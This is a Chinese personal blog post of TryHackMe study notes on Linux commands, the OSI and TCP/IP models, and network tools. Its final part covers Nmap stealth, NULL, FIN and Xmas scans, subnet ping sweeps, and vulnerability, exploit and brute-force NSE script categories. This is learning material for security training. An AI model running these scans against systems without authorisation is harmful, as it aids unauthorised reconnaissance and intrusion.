<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="false" > 
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/fontawesome.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/brands.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/solid.min.css" rel="stylesheet">
<script src="/js/color.global.min.js" ></script>
<script src="/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
  
  

  
  <title>网络安全基础 | T1@n的blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">

  <meta name="description" content="Linux基础知识第一部分echo    输出我们提供的任何文本whoami    找出我们当前以哪个用户身份登录想要输出文本“ TryHackMe ”，我们的命令是什么：echo TryHackMe ls    清单cd    进入&#x2F;更改目录cat    连接&#x2F;列出文件内容pwd    打印工作目录 find    搜索文件find -name password.txt （已">
<meta property="og:type" content="article">
<meta property="og:title" content="网络安全基础">
<meta property="og:url" content="http://example.com/2024/09/02/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/index.html">
<meta property="og:site_name" content="T1@n的blog">
<meta property="og:description" content="Linux基础知识第一部分echo    输出我们提供的任何文本whoami    找出我们当前以哪个用户身份登录想要输出文本“ TryHackMe ”，我们的命令是什么：echo TryHackMe ls    清单cd    进入&#x2F;更改目录cat    连接&#x2F;列出文件内容pwd    打印工作目录 find    搜索文件find -name password.txt （已">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2024-09-02T08:59:22.000Z">
<meta property="article:modified_time" content="2024-09-03T06:46:15.573Z">
<meta property="article:author" content="T1@n">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="T1@n的blog" type="application/atom+xml">
  
  
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  
   
  <div id="main-grid" class="  ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>T1@n的blog </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/">Home</a>
    
      <a class="main-nav-link" href="/archives">Archives</a>
    
      <a class="main-nav-link" href="/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
    </a>
    
      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS 订阅">
        <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M198-120q-25.846 0-44.23-18.384-18.384-18.385-18.384-44.23 0-25.846 18.384-44.23 18.384-18.385 44.23-18.385 25.846 0 44.23 18.385 18.384 18.384 18.384 44.23 0 25.845-18.384 44.23Q223.846-120 198-120Zm538.385 0q-18.846 0-32.923-13.769-14.076-13.769-15.922-33.23-8.692-100.616-51.077-188.654-42.385-88.039-109.885-155.539-67.5-67.501-155.539-109.885Q283-663.462 182.385-672.154q-19.461-1.846-33.23-16.23-13.769-14.385-13.769-33.846t14.076-32.922q14.077-13.461 32.923-12.23 120.076 8.692 226.038 58.768 105.961 50.077 185.73 129.846 79.769 79.769 129.846 185.731 50.077 105.961 58.769 226.038 1.231 18.846-12.538 32.922Q756.461-120 736.385-120Zm-252 0q-18.231 0-32.423-13.461t-18.653-33.538Q418.155-264.23 348.886-333.5q-69.27-69.27-166.501-84.423-20.077-4.462-33.538-18.961-13.461-14.5-13.461-33.346 0-19.076 13.884-33.23 13.884-14.153 33.115-10.922 136.769 15.384 234.384 112.999 97.615 97.615 112.999 234.384 3.231 19.23-10.538 33.115Q505.461-120 484.385-120Z"/></svg>
      </a>
    
    <div id="nav-menu-btn" class="nav-icon">
      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/">Home</a>
    
      <a class="nav-dropdown-link" href="/archives">Archives</a>
    
      <a class="nav-dropdown-link" href="/about">About</a>
    
    
      <a class="nav-dropdown-link" href="/atom.xml" title="RSS 订阅">RSS</a>
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=/image/avatar.png></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">T1@n </div>
      <div class="dot"></div>
      <div class="subtitle">网络安全 </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://qm.qq.com/cgi-bin/qm/qr?k=-pr7mz--Jz7XA5njimaed_3BoESRAnDD" title="QQ"><i class="fa-brands fa-Steam"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com" title="GitHub"><i class="fa-brands fa-github"></i></a>
         
      </div>  
    </div>
  </div>
</div>

  
  <div class="sticky">
    
      


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">分类</h3>
      <div class="category-box">
            <a class="category-link" href="/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/">
                攻防世界
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/categories/Java/">
                Java
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/">
                网络安全基础
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/">
                渗透基础
                <div class="category-count">1</div>
            </a>
        </div>
    </div>
  </div>


    
      

    
  </div>
</sidebar>
    </div>
    <div id="content-body">
       


<article id="post-网络安全基础" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        网络安全基础
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2024-09-02T08:59:22.000Z" itemprop="datePublished">2024-09-02</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
  <a class="meta-cate-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/">网络安全基础</a>
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            22k 词 
          </div>
        </div>
        
      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <h3 id="Linux基础知识"><a href="#Linux基础知识" class="headerlink" title="Linux基础知识"></a>Linux基础知识</h3><h4 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h4><p>echo    输出我们提供的任何文本<br>whoami    找出我们当前以哪个用户身份登录<br>想要输出文本“ <strong>TryHackMe</strong> ”，我们的命令是什么：echo TryHackMe</p>
<p>ls    清单<br>cd    进入&#x2F;更改目录<br>cat    连接&#x2F;列出文件内容<br>pwd    打印工作目录</p>
<p>find    搜索文件<br>find -name password.txt （已知文件名）<br>find -name *.txt （已知文件后缀）</p>
<p>grep    在文件内容中搜索正在寻找的特定值<br>wc    计算条目<br>grep “81.143.211.90” access.log （使用“grep”在“access.log”中查找 IP 地址为“81.143.211.90”的任何条目）<br>wc -l access.log （使用“wc”计算“access.log”中的条目数）</p>
<p>Shell运算符<br>&amp;    该操作符允许您在终端后台运行命令。<br>&amp;&amp;    运算符允许您在终端的一行中将多个命令组合在一起。<br>‘&gt;’    操作符是一个重定向器 - 这意味着我们可以获取命令的输出（例如使用 cat 来输出文件）并将其指向其他地方。<br>‘&gt;&gt;’    该运算符执行与运算符相同的功能<code>&gt;</code>，但附加输出而不是替换（意味着没有覆盖任何内容）<br>command1 &amp;&amp; command2 只有在成功command1时command2才会运行<br><code>echo hey &gt; welcome</code>在想要创建文件的地方运行，内容为“hey”    echo hey &gt; welcome    cat welcome    hey<br>echo hello &gt;&gt; welcome    cat welcome             hey hello</p>
<h4 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h4><p>ssh访问linux机器    ssh 用户名@Machine_IP</p>
<p>touch    创建文件<br>mkdir    创建文件夹<br>cp    复制文件或文件夹<br>mv    移动文件或文件夹<br>rm    删除文件或文件夹<br>file    确定文件的类型<br>rm 删除文件  rm -R删除文件夹<br>将“note”复制到“note2”。cp note note2<br>文件“note2”重命名为“note3” mv note2 note3<br>确定文件类型 file note<br>su user2 与登录系统的实际用户更相似的 shell - 我们继承了新用户的更多属性，即环境变量等<br>su -l user2带入前一个用户的主目录</p>
<p>公用目录<br>&#x2F;etc    存储操作系统使用的系统文件的常用位置。<br>&#x2F;var    存储系统上运行的服务或应用程序经常访问或写入的数据。<br>&#x2F;root    是“root”系统用户的家。<br>&#x2F;tmp    目录是“临时”的缩写，它是易失性的，用于存储只需要访问一两次的数据。与计算机上的内存类似，一旦计算机重新启动，此文件夹的内容就会被清除。进行渗透测试来说，任何用户默认都可以写入此文件夹。</p>
<h4 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h4><p>vim nano<br>Wget（下载文件）<br>此命令允许我们通过 HTTP 从 Web 下载文件——就像您在浏览器中访问文件一样。我们只需提供要下载的资源的地址即可    wget <a target="_blank" rel="noopener" href="https://assets.tryhackme.com/additional/linux-fundamentals/part3/myfile.txt">https://assets.tryhackme.com/additional/linux-fundamentals/part3/myfile.txt</a></p>
<p>从主机传输文件 - SCP（SSH）</p>
<p>远程系统的 IP 地址192.168.1.30    远程系统上的用户Ubuntu    本地系统上的文件名称important.txt     希望在远程系统上存储文件的名称 transferred.txt<br>将示例文件从我们的机器复制到远程机器 scp important.txt <a href="mailto:&#x75;&#x62;&#117;&#110;&#116;&#117;&#64;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#x31;&#x2e;&#51;&#x30;">&#x75;&#x62;&#117;&#110;&#116;&#117;&#64;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#x31;&#x2e;&#51;&#x30;</a>:&#x2F;home&#x2F;ubuntu&#x2F;transferred.txt</p>
<p>远程系统的 IP 地址192.168.1.30    远程系统上的用户Ubuntu    远程系统上的文件名称documents.txt    希望在系统上存储文件的名称notes.txt<br>用于从未登录的远程计算机复制文件 的语法    scp <a href="mailto:&#x75;&#x62;&#117;&#110;&#116;&#117;&#x40;&#49;&#57;&#50;&#46;&#x31;&#x36;&#56;&#x2e;&#x31;&#46;&#51;&#48;">&#x75;&#x62;&#117;&#110;&#116;&#117;&#x40;&#49;&#57;&#50;&#46;&#x31;&#x36;&#56;&#x2e;&#x31;&#46;&#51;&#48;</a>:&#x2F;home&#x2F;ubuntu&#x2F;documents.txt notes.txt</p>
<p>ps查看进程<br>要终止 PID 1337，我们将使用<code>kill 1337</code><br>让进程&#x2F;服务在启动时启动  systemctl [option] [service] [service]<br>option:Star ,Stop ,Enable ,Disable</p>
<p>cron进程<br>Crontab 是在启动期间启动的进程之一，负责促进和管理 cron 作业。<br>crontab 需要 6 个特定值：<br>MIN    在什么时候执行<br>HOUR    什么时间执行<br>DOM    在每月的哪一天执行<br>MON    在一年中的哪个月执行<br>DOW    在星期几执行<br>CMD    将要执行的实际命令<br>以备份文件为例。您可能希望每 12 小时备份一次“cmnatic”的“文档”。我们将使用以下格式：<br>0 *&#x2F;12 * * * cp -R &#x2F;home&#x2F;cmnatic&#x2F;Documents &#x2F;var&#x2F;backups&#x2F;<br>不关心它在哪月、哪日或哪年执行 — — 只关心它每 12 小时执行一次，我们只需放置一个星号即可</p>
<p>包管理apt<br>下载GPG密钥并使用 apt-key 来信任它wget -qO - <a target="_blank" rel="noopener" href="https://download.sublimetext.com/sublimehq-pub.gpg">https://download.sublimetext.com/sublimehq-pub.gpg</a> | sudo apt-key add -<br>更新 apt 以识别此新条目apt update。继续安装我们信任并添加到 apt 的软件，使用 <code>apt install sublime-text</code><br>删除软件包就像逆向操作一样简单。这个过程可以通过使用命令<code>add-apt-repository --remove ppa:PPA_Name/ppa</code>或手动删除我们之前添加的文件来完成。删除后，我们只需使用<code>apt remove [software-name-here]</code>ie<code>apt remove sublime-text</code></p>
<p>日志<br>三个服务的一些日志：</p>
<ul>
<li>Apache2 Web 服务器</li>
<li>fail2ban 服务的日志，用于监控暴力破解尝试，例如</li>
<li>用作防火墙的 UFW 服务<br>两种类型的日志文件值得关注：</li>
<li>访问日志</li>
<li>错误日志</li>
</ul>
<h3 id="网络利用基础知识"><a href="#网络利用基础知识" class="headerlink" title="网络利用基础知识"></a>网络利用基础知识</h3><h4 id="入门网络"><a href="#入门网络" class="headerlink" title="入门网络"></a>入门网络</h4><p>OSI模型</p>
<p>第 7 层–应用程序：</p>
<p>OSI 模型的应用层本质上为计算机上运行的程序提供联网选项。它几乎只与应用程序一起工作，为它们提供用于传输数据的接口。当数据被提供给应用层时，它会被传递到表示层。  </p>
<p>第 6 层–表示：</p>
<p>表示层从应用层接收数据。这些数据往往是应用程序可以理解的格式，但不一定是一种_接收_ 计算机中的应用层可以理解的标准化格式。表示层将数据转换为标准化格式，并处理数据的任何加密、压缩或其他转换。完成此操作后，数据将传递到会话层。</p>
<p>第 5 层–会话：</p>
<p>当会话层从表示层接收到格式正确的数据时，它会查看是否可以通过网络与另一台计算机建立连接。如果不能，它会发回错误，并且该过程不再继续。如果可以_建立_会话 ，那么会话层的工作就是维护它，并与远程计算机的会话层合作以同步通信。会话层特别重要，因为它创建的会话对于相关通信是唯一的。这就是您可以同时向不同端点发出多个请求而不会混淆所有数据的原因（想想同时在 Web 浏览器中打开两个选项卡）！当会话层成功记录主机和远程计算机之间的连接时，数据将传递到第 4 层：传输层。</p>
<p>第 4 层–传输：</p>
<p>传输层是一个非常有趣的层，它提供许多重要功能。它的第一个目的是选择要通过哪种协议传输数据。传输层中最常见的两种协议是TCP（传输控制协议）<strong>和</strong>UDP <strong>（</strong>用户数据协议<strong>）****；</strong>使用<strong>TCP</strong>，传输<strong>是</strong>基于_连接的_，这意味着在请求期间建立并维持计算机之间的连接。这允许可靠的传输，因为可以使用连接来确保所有数据包都_到达_ 正确的位置。TCP 连接允许两台计算机保持持续通信，以确保以可接受的速度发送数据，并重新发送任何丢失的数据。对于 UDP，情况正好相反；数据包基本上被扔到接收计算机上——如果它跟不上，那就是它的_问题_（这就是为什么如果连接不好，通过像 Skype 这样的程序传输的视频可能会出现像素化的原因）。这意味着，在准确性比速度更重要的情况下（例如文件传输或加载网页），通常会选择 TCP，而在速度更重要的情况下（例如视频流），则会使用UDP 。</p>
<p>选择协议后，传输层会将传输分成小块（通过TCP，这些块称为_段_；通过 UDP，这些块称为_数据报_），这使得成功传输消息变得更容易。 </p>
<p>第 3 层–网络：</p>
<p>网络层负责定位请求的目的地。例如，互联网是一个巨大的网络；当您想要从网页请求信息时，网络层会获取页面的 IP 地址并找出最佳路由。在此阶段，我们正在使用所谓的_逻辑_寻址（即 IP 地址），它仍然由软件控制。逻辑地址用于为网络提供顺序，对网络进行分类并允许我们对其进行正确排序。目前最常见的逻辑寻址形式是 IPV4 格式，您可能已经熟悉它（即 192.168.1.1 是家用路由器的常用地址）。</p>
<p>第 2 层–数据链路：</p>
<p>数据链路层专注于传输的_物理_寻址。它从网络层接收数据包（包括远程计算机的 IP 地址），并添加接收端点的物理 (MAC) 地址。每台联网计算机内部都有一个网络 接口卡(  NIC )  ，它带有一个唯一的 MAC（媒体访问控制 ）地址 来识别它。</p>
<p>MAC 地址由制造商设置，并刻录在卡上；无法更改——尽管可以 <em>被</em> 伪造。当信息通过网络发送时，实际上是使用物理地址来识别将信息发送到何处。</p>
<p>此外，数据链路层的工作还包括以适合传输的格式呈现数据。</p>
<p>数据链路层在接收数据时也发挥着重要作用，因为它检查接收到的信息以确保其在传输过程中没有被损坏，而当数据通过第 1 层（即物理层）传输时，很可能会发生这种情况。</p>
<p>第 1 层 - 物理层：</p>
<p>物理层直接位于计算机硬件层。构成网络数据传输的电脉冲就是在这里发送和接收的。物理层的工作是将传输的二进制数据转换为信号并通过网络传输，以及接收传入信号并将其转换回二进制数据。</p>
<p>TCP&#x2F;IP<br>由四层组成：应用层、传输层、互联网层和网络接口层。<br>应用层：应用程序，表示，会话<br>传输层：传输层<br>互联网层：网络<br>网络接口层：数据链路层，物理层</p>
<p>三次握手<br>尝试建立连接时，您的计算机首先向远程服务器发送一个特殊请求，表示它想要初始化连接。此请求包含一个称为_SYN_（同步的缩写_）位，它实际上是在启动连接过程时进行首次接触。然后，服务器将使用包含 SYN 位以及另一个“确认”位（称为_ACK_）的数据包进行响应。最后，您的计算机将发送一个仅包含 ACK 位的数据包，确认连接已成功建立。成功完成三次握手后，数据可以在两台计算机之间可靠地传输。传输过程中丢失或损坏的任何数据都会重新发送，从而导致连接看似无损。</p>
<p>网络工具：ping<br>基本语法：ping  ‘target’<br>更改发送 ping 请求的间隔 ping ‘target’ -i<br>限制对 IPv4 的请求 ping ‘target’ -4<br>更详细的输出 ping ‘target’ -v</p>
<p>网络工具：traceroute<br>基本语法：traceroute ‘destination’<br>指定接口 traceroute ‘destination’ -i<br>在跟踪路由时使用 TCP SYN 请求 traceroute ‘destination’ -T</p>
<p>网络工具：whois<br>sudo apt update &amp;&amp; sudo apt install whois<br>基本语法：whois ‘domain’（获取有关域名注册的可用信息列表）</p>
<p>网络工具：dig<br>基本语法：dig ‘domain’ @’dns-server-ip’（允许手动查询我们选择的递归DNS服务器以获取有关域的信息）</p>
<h4 id="网络地图"><a href="#网络地图" class="headerlink" title="网络地图"></a>网络地图</h4><p>namp<br>目标 IP 是否响应 ICMP 回显（ping）请求    -PE<br>UDP扫描    -sU<br>检测目标正在运行哪种操作系统    -O<br>检测目标上运行的服务的版本    -sV<br>增加详细程度    -v<br>将详细程度设置为二级    -vv<br>将 nmap 结果保存为三种主要格式    -oA<br>以“正常”格式保存 nmap 结果    -oG<br>“激进”模式（可激活服务检测、操作系统检测、跟踪路由和常见脚本扫描）    -A</p>
<p>Nmap 提供五种级别的“计时”模板。这些模板主要用于提高扫描速度。<br>将计时模板设置为 5 级    -T5<br>仅扫描端口80    -p 80<br>扫描端口1000-1500    -p 1000-1500<br>扫描所有端口    -p-<br>从nmap脚本库中激活脚本    –script<br>激活“vuln”类别中的所有脚本    –script&#x3D;vuln</p>
<p>使用Nmap进行端口扫描时，有三种基本扫描类型：</p>
<ul>
<li>TCP连接扫描 ( <code>-sT</code>)</li>
<li>SYN“半开”扫描（<code>-sS</code>）</li>
<li>UDP扫描 ( <code>-sU</code>)<br>不太常见的端口扫描类型：</li>
<li>TCP空扫描 ( <code>-sN</code>)</li>
<li>TCP FIN 扫描（<code>-sF</code>）</li>
<li>TCP圣诞节扫描 ( <code>-sX</code>)</li>
</ul>
<p>TCP连接扫描    -sT<br>首先，连接终端（在本例中为我们的攻击机器）向目标服务器发送设置了 SYN 标志的TCP请求。然后，服务器使用包含SYN 标志和 ACK 标志的TCP响应确认此数据包。最后，我们的终端通过发送设置了 ACK 标志的TCP请求来完成握手。<br>RFC 9293 定义了TCP协议的适当行为<br>如果端口关闭，服务器发回RST来表明这一点</p>
<p>SYN扫描    -sS<br>SYN 扫描有时被称为“半开”扫描或“隐身”扫描<br>于扫描一个或多个目标的 TCP 端口范围；但是，这两种扫描类型的工作方式略有不同。SYN 扫描有时被称为“半开”扫描或“隐身”扫描。<br>SYN 扫描在收到来自服务器的 SYN&#x2F;ACK 后会发回 RST TCP数据包（这可防止服务器重复尝试发出请求）<br>需要 sudo 权限才能在Linux中正常工作。这是因为 SYN 扫描需要创建原始数据包的能力（而不是完整的TCP握手），而默认情况下只有 root 用户才拥有该权限<br>不稳定的服务有时会因 SYN 扫描而瘫痪，如果客户为测试提供了生产环境，这可能会带来问题。</p>
<p>UDP扫描    -sU<br>UDP连接是_无状态的。这意味着，_ UDP连接不是通过来回“握手”来发起连接，而是依赖于将数据包发送到目标端口并希望它们成功。这使得UDP非常适合依赖于速度而非质量的连接（例如视频共享），但缺乏确认使UDP扫描起来更加困难（并且速度要慢得多）。<br>当数据包发送到开放的UDP端口时，应该没有响应。当这种情况发生时，Nmap会将该端口称为<code>open|filtered</code>。怀疑该端口是开放的，但可能被防火墙保护。如果它收到UDP响应（这很不常见），则将该端口标记为_开放_。更常见的情况是没有响应，在这种情况下，请求会再次发送以进行复查。如果仍然没有响应，则将该端口标记为_开放|过滤_。<br>当数据包发送到_已关闭的_ UDP端口时，目标应使用 ICMP（ping）数据包进行响应，其中包含端口不可访问的消息。这清楚地标识了已关闭的端口，Nmap会将其标记为已关闭并继续前进。<br><code>--top-ports &lt;number&gt;</code>，使用 进行扫描  <code>nmap -sU --top-ports 20 &lt;target&gt;</code>。将扫描前 20 个最常用的UDP端口，从而获得更可接受的扫描时间。<br>扫描UDP端口时，Nmap 通常会发送完全空的请求 - 仅发送原始UDP数据包。也就是说，对于通常由知名服务占用的端口，它将发送特定于协议的有效负载，这更有可能引发响应，从而可以得出更准确的结果。</p>
<p>NULL、FIN、Xmas<br>NULL 扫描 ( <code>-sN</code>) 是指在发送TCP请求时完全不设置任何标志。根据RFC，如果端口已关闭，目标主机应以 RST 进行响应。<br>FIN 扫描 ( <code>-sF</code>) 的工作方式几乎相同；但是，它不是发送完全空的数据包，而是发送带有 FIN 标志的请求（通常用于正常关闭活动连接）。同样，如果端口已关闭，Nmap会期望收到 RST。<br>Xmas 扫描 ( <code>-sX</code>) 发送格式错误的 TCP 数据包并期望对已关闭的端口进行 RST 响应。它之所以被称为 xmas 扫描，是因为它设置的标志（PSH、URG 和 FIN）在 Wireshark 中以数据包捕获的形式查看时，使其看起来像一棵闪烁的圣诞树。</p>
<p>ICMP网络扫描<br>黑盒任务中首次连接到目标网络时，我们的第一个目标是获得网络结构的“地图” - 或者换句话说，我们想看看哪些 IP 地址包含活动主机，哪些不包含。<br>Nmap 向指定网络的每个可能的 IP 地址发送一个 ICMP 数据包。当它收到响应时，它会将响应的 IP 地址标记为活动状态<br>将交换机与可以用连字符 ( ) 或 CIDR 表示<code>-sn</code>法指定的 IP 范围结合使用。即，我们可以使用以下方法扫描网络：<code>-``192.168.0.x</code><br><code>nmap -sn 192.168.0.1-254</code>或者<code>nmap -sn 192.168.0.0/24</code></p>
<p><code>-sn</code>告诉 Nmap 不要扫描任何端口 — 迫使它主要依靠 ICMP 回显数据包（或本地网络上的ARP<code>-sn</code>请求，如果使用 sudo 或直接以 root 用户身份运行）来识别目标。除了 ICMP 回显请求之外，开关还将导致 nmap 向目标的端口 443 发送TCP SYN 数据包，以及向目标的端口 80 发送TCP ACK（或TCP SYN，如果不是以 root 用户身份运行）数据包。</p>
<h5 id="NES脚本"><a href="#NES脚本" class="headerlink" title="NES脚本"></a>NES脚本</h5><h6 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h6><p>可用于执行各种操作：从扫描漏洞到自动利用漏洞。</p>
<ul>
<li><code>safe</code>:- 不会影响目标</li>
<li><code>intrusive</code>:- 不安全：可能会影响目标  </li>
<li><code>vuln</code>:- 扫描漏洞</li>
<li><code>exploit</code>:- 尝试利用漏洞</li>
<li><code>auth</code>:- 尝试绕过正在运行的服务的身份验证（例如匿名登录FTP服务器）</li>
<li><code>brute</code>:- 尝试暴力破解正在运行的服务的凭证</li>
<li><code>discovery</code>:- 尝试查询正在运行的服务以获取有关网络的更多信息（例如查询 SNMP 服务器）</li>
</ul>
